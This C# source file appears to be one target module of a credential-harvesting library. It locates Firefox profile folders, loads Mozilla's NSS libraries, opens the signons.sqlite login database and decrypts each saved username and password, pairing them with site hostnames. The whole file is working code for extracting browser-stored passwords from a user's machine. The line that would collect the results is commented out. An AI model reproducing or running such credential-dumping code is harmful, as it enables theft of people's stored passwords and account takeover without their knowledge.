using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using Community.CsharpSqlite;
using PInvoke;

namespace LibCredentials.Targets
{
    public class Firefox : Target
    {
        private readonly string _defaultPath = Environment.GetEnvironmentVariable("APPDATA") +
                                               @"\Mozilla\Firefox\Profiles";

        private readonly string _mozillaPath = Environment.GetEnvironmentVariable("PROGRAMFILES") +
                                               @"\Mozilla Firefox\";

        private Kernel32.SafeLibraryHandle _nss3;

        private long NSS_Init(string configdir)
        {
            Kernel32.LoadLibrary(_mozillaPath + "mozcrt19.dll");
            Kernel32.LoadLibrary(_mozillaPath + "nspr4.dll");
            Kernel32.LoadLibrary(_mozillaPath + "plc4.dll");
            Kernel32.LoadLibrary(_mozillaPath + "plds4.dll");
            Kernel32.LoadLibrary(_mozillaPath + "ssutil3.dll");
            Kernel32.LoadLibrary(_mozillaPath + "sqlite3.dll");
            Kernel32.LoadLibrary(_mozillaPath + "nssutil3.dll");
            Kernel32.LoadLibrary(_mozillaPath + "softokn3.dll");

            _nss3 = Kernel32.LoadLibrary(_mozillaPath + "nss3.dll");
            var pProc = Kernel32.GetProcAddress(_nss3, "NSS_Init");
            var dll = (NssInitDelegate) Marshal.GetDelegateForFunctionPointer(pProc, typeof(NssInitDelegate));
            return dll(configdir);
        }

        private long PK11_GetInternalKeySlot()
        {
            var pProc = Kernel32.GetProcAddress(_nss3, "PK11_GetInternalKeySlot");
            var dll =
                (Pk11GetInternalKeySlotDelegate)
                Marshal.GetDelegateForFunctionPointer(pProc, typeof(Pk11GetInternalKeySlotDelegate));
            return dll();
        }

        private long PK11_Authenticate(long slot, bool loadCerts, long wincx)
        {
            var pProc = Kernel32.GetProcAddress(_nss3, "PK11_Authenticate");
            var dll =
                (Pk11AuthenticateDelegate)
                Marshal.GetDelegateForFunctionPointer(pProc, typeof(Pk11AuthenticateDelegate));
            return dll(slot, loadCerts, wincx);
        }

        private int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            var pProc = Kernel32.GetProcAddress(_nss3, "NSSBase64_DecodeBuffer");
            var dll =
                (NssBase64DecodeBufferDelegate)
                Marshal.GetDelegateForFunctionPointer(pProc, typeof(NssBase64DecodeBufferDelegate));
            return dll(arenaOpt, outItemOpt, inStr, inLen);
        }

        private int PK11SDR_Decrypt(ref TsecItem data, ref TsecItem result, int cx)
        {
            var pProc = Kernel32.GetProcAddress(_nss3, "PK11SDR_Decrypt");
            var dll =
                (Pk11SdrDecryptDelegate) Marshal.GetDelegateForFunctionPointer(pProc, typeof(Pk11SdrDecryptDelegate));
            return dll(ref data, ref result, cx);
        }

        private string GetSignons(string path)
        {
            foreach (var dir in Directory.GetDirectories(path))
                foreach (var currFile in Directory.GetFiles(dir))
                    if (Regex.IsMatch(currFile, "signons.sqlite"))
                    {
                        NSS_Init(dir);
                        return currFile;
                    }

            return null;
        }

        protected override void _GetCredentials(List<Credential> credentials)
        {
            if (!Directory.Exists(_defaultPath))
                return;

            var dataSource = GetSignons(_defaultPath);

            Sqlite3.sqlite3 ppDb;
            if (Sqlite3.sqlite3_open(dataSource, out ppDb) == Sqlite3.SQLITE_OK)
            {
                var ppStmt = new Sqlite3.Vdbe();
                if (Sqlite3.sqlite3_prepare_v2(ppDb, "SELECT * FROM moz_logins", -1, ref ppStmt, 0) == Sqlite3.SQLITE_OK)
                {
                    while (Sqlite3.sqlite3_step(ppStmt) == Sqlite3.SQLITE_ROW)
                    {
                        var credential = new Credential(TargetTypes.Firefox);
                        for (var col = 0; col < Sqlite3.sqlite3_column_count(ppStmt); col++)
                        {
                            var colName = Sqlite3.sqlite3_column_name(ppStmt, col);
                            var columnText = Sqlite3.sqlite3_column_text(ppStmt, col);

                            if ((colName == null) || (columnText == null))
                                continue;

                            if ((colName == "encryptedUsername") || (colName == "encryptedPassword"))
                            {
                                var se = new StringBuilder(columnText);
                                var hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
                                var item = (TsecItem) Marshal.PtrToStructure(new IntPtr(hi2), typeof(TsecItem));

                                var tSecDec = new TsecItem();
                                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                                    if (tSecDec.SecItemLen != 0)
                                    {
                                        var bvRet = new byte[tSecDec.SecItemLen];
                                        Marshal.Copy(new IntPtr(tSecDec.SecItemData), bvRet, 0, tSecDec.SecItemLen);

                                        if (colName == "encryptedUsername")
                                            credential.Username = Encoding.ASCII.GetString(bvRet);
                                        else if (colName == "encryptedPassword")
                                            credential.Password = Encoding.ASCII.GetString(bvRet);
                                    }
                            }
                            else if (colName == "hostname")
                            {
                                credential.Extra = columnText;
                            }
                        }

                        //credentials->Add(credential);	
                    }

                    Sqlite3.sqlite3_finalize(ppStmt);
                }

                Sqlite3.sqlite3_close(ppDb);
            }
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int NssBase64DecodeBufferDelegate(
            IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long NssInitDelegate(string configdir);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long Pk11AuthenticateDelegate(long slot, bool loadCerts, long wincx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long Pk11GetInternalKeySlotDelegate();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int Pk11SdrDecryptDelegate(ref TsecItem data, ref TsecItem result, int cx);

        [StructLayout(LayoutKind.Sequential)]
        private struct TsecItem
        {
            public readonly int SecItemType;
            public readonly int SecItemData;
            public readonly int SecItemLen;
        }
    }
}